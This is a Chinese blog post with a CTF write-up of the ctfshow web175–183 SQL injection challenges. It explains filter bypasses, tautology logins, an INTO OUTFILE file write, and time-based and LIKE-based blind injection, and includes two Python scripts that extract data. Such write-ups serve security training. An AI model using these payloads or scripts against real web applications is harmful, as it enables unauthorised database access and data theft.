<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ctfshow web175-183 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ctfshow web175-183" />
<meta property="og:description" content="目录
Web 175
Web 176
Web 177
Web 178
Web 179
Web 180
Web 181
Web 182
Web 183
Web 175 if(!preg_match(&#39;/[\x00-\x7f]/i&#39;, json_encode($ret))) 刚开始不知道这句话是什莫意思，还在尝试之前的方法，发现没用。
\xnn 匹配ASCII代码中十六进制代码为nn的字符
[\x00-\x7f] 匹配ASCII值从0-127的字符
所以ASCII值得0-127都被过滤了，select没法用了。
只能盲注了，试一下 1&#39; and sleep(6)--&#43; 发现确实有延迟，所以可以考虑时间盲注。 时间盲注： 通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。简单说就是，当页面出现延时响应，且响应时间与设定的时间函数一致，则表示前半部分的猜测正确，若出现查询直接返回结果，页面响应未出现延迟，则说明未执行到时间函数的部分，and的判断中，前半部分就已经出错了。 利用脚本来获取flag。 import requests from time import time url=&#39;http://774b555f-930c-4ab9-acbe-7ef82922d659.chall.ctf.show/api/v5.php&#39; flag=&#39;&#39; for i in range(1,100): length=len(flag) min=32 max=128 while 1: j=min&#43;(max-min)//2 if min==j: flag&#43;=chr(j) print(flag) break payload=&#34;?id=&#39; union select &#39;a&#39;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#39;flag&#39;),%d,1))&lt;%d,sleep(0.5),1) -- -&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/06e7d3b859b7972e3ae5413fb2d37ce8/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-03-14T18:52:40+08:00" />
<meta property="article:modified_time" content="2022-03-14T18:52:40+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ctfshow web175-183</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="Web%20175-toc" style="margin-left:0px;"><a href="#Web%20175" rel="nofollow">Web 175</a></p> 
<p id="Web%20176-toc" style="margin-left:0px;"><a href="#Web%20176" rel="nofollow">Web 176</a></p> 
<p id="Web%20177-toc" style="margin-left:0px;"><a href="#Web%20177" rel="nofollow">Web 177</a></p> 
<p id="Web%20178-toc" style="margin-left:0px;"><a href="#Web%20178" rel="nofollow">Web 178</a></p> 
<p id="Web%20179-toc" style="margin-left:0px;"><a href="#Web%20179" rel="nofollow">Web 179</a></p> 
<p id="Web%20180-toc" style="margin-left:0px;"><a href="#Web%20180" rel="nofollow">Web 180</a></p> 
<p id="Web%20181-toc" style="margin-left:0px;"><a href="#Web%20181" rel="nofollow">Web 181</a></p> 
<p id="Web%20182-toc" style="margin-left:0px;"><a href="#Web%20182" rel="nofollow">Web 182</a></p> 
<p id="Web%20183-toc" style="margin-left:0px;"><a href="#Web%20183" rel="nofollow">Web 183</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="Web%20175" style="margin-left:.0001pt;text-align:justify;">Web 175</h2> 
<pre><code>if(!preg_match('/[\x00-\x7f]/i', json_encode($ret)))</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">刚开始不知道这句话是什莫意思，还在尝试之前的方法，发现没用。</p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>\xnn 匹配ASCII代码中十六进制代码为nn的字符<br> [\x00-\x7f] 匹配ASCII值从0-127的字符</strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">所以ASCII值得0-127都被过滤了，select没法用了。</p> 
<pre style="margin-left:.0001pt;">只能盲注了，试一下</pre> 
<pre><code>1' and sleep(6)--+</code></pre> 
<pre style="margin-left:.0001pt;">发现确实有延迟，所以可以考虑时间盲注。</pre> 
<pre style="margin-left:.0001pt;">时间盲注：</pre> 
<pre style="margin-left:.0001pt;">通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。简单说就是，当页面出现延时响应，且响应时间与设定的时间函数一致，则表示前半部分的猜测正确，若出现查询直接返回结果，页面响应未出现延迟，则说明未执行到时间函数的部分，and的判断中，前半部分就已经出错了。</pre> 
<pre style="margin-left:.0001pt;">利用脚本来获取flag。</pre> 
<pre><code>import requests

from time import time


url='http://774b555f-930c-4ab9-acbe-7ef82922d659.chall.ctf.show/api/v5.php'


flag=''

for i in range(1,100):

    length=len(flag)

    min=32

    max=128

    while 1:

        j=min+(max-min)//2

        if min==j:

            flag+=chr(j)

            print(flag)

            break


        payload="?id=' union select 'a',if(ascii(substr((select group_concat(password) from ctfshow_user5 where username='flag'),%d,1))&lt;%d,sleep(0.5),1) -- -"%(i,j)


        start_time=time()

        r=requests.get(url=url+payload).text

        end_time=time()

        #print(r)



        if end_time-start_time&gt;0.48:

            max=j

        else :

            min=j</code></pre> 
<pre style="margin-left:.0001pt;">另一种方法：</pre> 
<pre><code>' union select 1,group_concat(password) from ctfshow_user5 into outfile '/var/www/html/1.txt'-- -</code></pre> 
<pre style="margin-left:.0001pt;">将flag写入1.txt文件中，访问即可得到flag。</pre> 
<h2 id="Web%20176" style="margin-left:.0001pt;">Web 176</h2> 
<pre style="margin-left:.0001pt;">知道有过滤，但不知道过滤的是谁，所以需要尝试一下。</pre> 
<pre style="margin-left:.0001pt;">首先传入1’--+，有回显。</pre> 
<pre style="margin-left:.0001pt;">传入1’ --+，有回显，空格没被过滤。</pre> 
<pre style="margin-left:.0001pt;">传入1' union elect database(),2,3 --+</pre> 
<pre style="margin-left:.0001pt;">显示不出数据库，猜测有的字母被过滤，都试了一下，于是发现当传入</pre> 
<pre><code>1' union Select database(),2,3 --+</code></pre> 
<pre style="margin-left:.0001pt;"></pre> 
<pre style="margin-left:.0001pt;">说明是select被过滤，但大小写可绕过，所以直接传入</pre> 
<pre><code>-1' union Select password,2,3 from ctfshow_user --+</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="462" src="https://images2.imgbox.com/3b/55/VAoasfDH_o.png" width="1070"></p> 
<p style="margin-left:.0001pt;text-align:justify;">得到flag。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h2 id="Web%20177" style="margin-left:.0001pt;text-align:justify;">Web 177</h2> 
<p style="margin-left:.0001pt;text-align:justify;">尝试了三个</p> 
<pre><code>1’--+

1’%23

1’ %23</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">确定了过滤了空格和--+，可以用%0a和%23代替。</p> 
<p style="margin-left:.0001pt;text-align:justify;">直接万能密码：</p> 
<pre><code>1'%0aor%0a1=1%23</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">或者直接</p> 
<pre><code>-1'union%0aselect%0apassword,1,2%0afrom%0actfshow_user%23</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">都能得到flag。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h2 id="Web%20178" style="margin-left:.0001pt;text-align:justify;">Web 178</h2> 
<p style="margin-left:.0001pt;text-align:justify;">还是和上一题一样。</p> 
<p style="margin-left:.0001pt;text-align:justify;">万能密码：</p> 
<pre><code>1'%0aor%0a1=1%23</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">或者直接传入：</p> 
<pre><code>-1'union%0aselect%0apassword,1,2%0afrom%0actfshow_user%23</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h2 id="Web%20179" style="margin-left:.0001pt;text-align:justify;">Web 179</h2> 
<p style="margin-left:.0001pt;text-align:justify;">尝试了一下</p> 
<pre><code>1'%23

1’%0a%23</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">发现这次是%0a被过滤了，可以用%0c替代%0a。</p> 
<p style="margin-left:.0001pt;text-align:justify;">万能密码：</p> 
<pre><code>1'%0cor%0c1=1%23</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">或者直接传入</p> 
<pre><code>-1'union%0cselect%0cpassword,1,2%0cfrom%0cctfshow_user%23</code></pre> 
<h2 id="Web%20180" style="margin-left:.0001pt;text-align:justify;">Web 180</h2> 
<p style="margin-left:.0001pt;text-align:justify;">传入1'%23，发现%23被过滤了。</p> 
<p style="margin-left:.0001pt;text-align:justify;">后边没办法注释了，还可以用’1’='1来闭合后边。</p> 
<pre><code>'union%0cselecT%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c'1'='1</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">还可以用</p> 
<pre><code>'or(id=26)and'1'='1</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">传进去后变成了</p> 
<pre><code>where username !='flag' and id = ''or(id=26)and'1'='1' limit 1;";</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">因为and的优先级大于or所以相当于</p> 
<pre><code>where （username !='flag' and id = '')  or  (id=26and'1'='1')</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">or左边为0右边为1，where的条件为1，而且flag刚好在id=26。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h2 id="Web%20181" style="margin-left:.0001pt;text-align:justify;">Web 181</h2> 
<p style="margin-left:.0001pt;text-align:justify;">可以替代空格的全都被过滤，select大小写绕不过去。</p> 
<p style="margin-left:.0001pt;text-align:justify;">还用上一题的方法</p> 
<pre><code>'or(id=26)and'1'='1</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">直接可以得到flag。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h2 id="Web%20182" style="margin-left:.0001pt;text-align:justify;">Web 182</h2> 
<p style="margin-left:.0001pt;text-align:justify;">还是用上一题的方法：</p> 
<pre><code>'or(id=26)and'1'='1</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h2 id="Web%20183" style="margin-left:.0001pt;text-align:justify;">Web 183</h2> 
<pre><code>preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">select语句用不了了，而且上一题的and也被过滤了。</p> 
<pre style="margin-left:.0001pt;">只能盲注了，利用%在sql中通配多个字符，利用_<code>通配任意一个字符。
成功后会发现发现返回结果  $user_count=1
代表匹配到了一个，利用此模式盲注。
</code>脚本：
</pre> 
<pre><code>import requests

import sys



url = "http://9ae11c4b-7472-42b5-9064-5ebe182da98c.challenge.ctf.show/select-waf.php"

letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

flag = "ctfshow{"

for i in range(100):

    for j in letter:

        data = {"tableName": "(ctfshow_user)where(pass)like'{}%'".format(flag + j)}

        r = requests.post(url=url, data=data).text

        # print(r)

        if "$user_count = 1;" in r:

            flag += j

            print(flag)

            break

        if j == "}":

            sys.exit()


</code></pre> 
<pre style="margin-left:.0001pt;"></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/6624ce9eed6e85ea8127e0f807774246/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Vue3.2 中的 setup 语法糖，保证你看的明明白白</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/2de00d58808b53d55c655735ec5fa40b/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">ARM Cortex-M0系统简介</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>